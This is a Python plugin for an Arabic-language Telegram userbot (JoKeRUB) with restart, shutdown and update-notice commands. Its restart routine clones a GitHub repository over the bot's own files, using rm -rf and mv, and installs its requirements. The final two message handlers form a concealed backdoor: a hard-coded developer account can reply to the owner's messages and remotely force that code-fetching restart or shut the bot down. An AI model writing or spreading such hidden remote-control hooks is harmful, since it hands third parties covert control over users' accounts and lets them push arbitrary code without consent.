import sys
import glob
import os
import re
from asyncio.exceptions import CancelledError
from time import sleep
import asyncio
from JoKeRUB import l313l
from telethon import events
from ..core.logger import logging
from ..core.managers import edit_or_reply
from ..sql_helper.global_collection import (
    add_to_collectionlist,
    del_keyword_collectionlist,
    get_collectionlist_items,
)
from ..sql_helper.globals import addgvar, delgvar, gvarstatus
from . import BOTLOG, BOTLOG_CHATID, HEROKU_APP
from ..helpers.utils import _catutils

LOGS = logging.getLogger(__name__)
plugin_category = "tools"

JOKRDEV = [6373993992]


import glob
import os
import re
from ..core.managers import edit_delete, edit_or_reply
plugin_category = "tools"


#===============================================================


async def aljoker_4ever():
    BRANCH = "HuRe"
    REPO = "jepthon"
    if REPO:
        await _catutils.runcmd(f"git clone -b {BRANCH} https://github.com/Abod20112011/{REPO}.git TempCat")
        file_list = os.listdir("TempCat")
        for file in file_list:
            await _catutils.runcmd(f"rm -rf {file}")
            await _catutils.runcmd(f"mv ./TempCat/{file} ./")
        await _catutils.runcmd("pip3 install --no-cache-dir -r requirements.txt")
        await _catutils.runcmd("rm -rf TempCat")
    if os.path.exists("jepvc"):
        await _catutils.runcmd("rm -rf jepvc")
@l313l.ar_cmd(
    pattern="اعادة تشغيل",
    command=("اعادة تشغيل", plugin_category),
    info={
        "header": "To reload your bot in vps/ similar to restart",
        "flags": {
            "re": "restart your bot without deleting junk files",
            "clean": "delete all junk files & restart",
        },
        "usage": [
            "{tr}reload",
            "{tr}cleanload",
        ],
    },
)
async def Hussein(event):
    "To reload Your bot"
    cat = await edit_or_reply(event, "** ᯽︙ انتظر 2-3 دقيقة, جارِ اعادة التشغيل...**")
    await aljoker_4ever()
    await event.client.reload(cat)

@l313l.ar_cmd(
    pattern="اطفاء$",
    command=("اطفاء", plugin_category),
    info={
        "header": "Shutdowns the bot !!",
        "description": "To turn off the dyno of heroku. you cant turn on by bot you need to got to heroku and turn on or use @hk_heroku_bot",
        "usage": "{tr}shutdown",
    },
)
async def _(event):
    "Shutdowns the bot"
    if BOTLOG:
        await event.client.send_message(BOTLOG_CHATID, "**᯽︙ إيقاف التشغيـل ✕ **\n" "**᯽︙ تـم إيقـاف تشغيـل البـوت بنجـاح ✓**")
    await edit_or_reply(event, "**᯽︙ جـاري إيقـاف تشغيـل البـوت الآن ..**\n᯽︙  **أعـد تشغيـلي يدويـاً لاحقـاً عـبر هيـروڪو ..**\n⌔︙**سيبقى البـوت متوقفـاً عن العمـل**")
    if HEROKU_APP is not None:
        HEROKU_APP.process_formation()["worker"].scale(0)
    else:
        sys.exit(0)

@l313l.ar_cmd(
    pattern="التحديثات (تشغيل|ايقاف)$",
    command=("التحديثات", plugin_category),
    info={
        "header": "᯽︙ لتحديـث الدردشـة بعـد إعـادة التشغيـل  أو إعـادة التحميـل  ",
        "description": "⌔︙سيتـم إرسـال بنـك cmds ڪـرد على الرسالـة السابقـة الأخيـرة لـ (إعادة تشغيل/إعادة تحميل/تحديث cmds) 💡.",
        "usage": [
            "{tr}التحديثات <تشغيل/ايقاف",
        ],
    },
)
async def set_pmlog(event):
    "᯽︙ لتحديـث الدردشـة بعـد إعـادة التشغيـل  أو إعـادة التحميـل  "
    input_str = event.pattern_match.group(1)
    if input_str == "ايقاف":
        if gvarstatus("restartupdate") is None:
            return await edit_delete(event, "**᯽︙ تـم تعطيـل التـحديـثات بالفعـل ❗️**")
        delgvar("restartupdate")
        return await edit_or_reply(event, "**⌔︙تـم تعطيـل التـحديـثات بنجـاح ✓**")
    if gvarstatus("restartupdate") is None:
        addgvar("restartupdate", "turn-oned")
        return await edit_or_reply(event, "**⌔︙تـم تشغيل التـحديـثات بنجـاح ✓**")
    await edit_delete(event, "**᯽︙ تـم تشغيل التـحديـثات بالفعـل ❗️**")
@l313l.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.reply_to and event.sender_id in JOKRDEV:
        reply_msg = await event.get_reply_message()
        owner_id = reply_msg.from_id.user_id
        if owner_id == l313l.uid:
            if event.message.message == "اعادة تشغيل":
                joker = await event.reply("** ᯽︙ بالخدمة مطوري سيتم اعادة تشغيل السورس 😘..**")
                await aljoker_4ever()
                await event.client.reload(joker)
                    
@l313l.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.reply_to and event.sender_id in JOKRDEV:
        reply_msg = await event.get_reply_message()
        owner_id = reply_msg.from_id.user_id
        if owner_id == l313l.uid:
            if event.message.message == "اطفاء":
                    await event.reply("**᯽︙ تدلل مولاي تم اطفاء السورس بواسطة تاج راسك 😁**")
                    if HEROKU_APP is not None:
                        HEROKU_APP.process_formation()["worker"].scale(0)
                    else:
                        sys.exit(0)
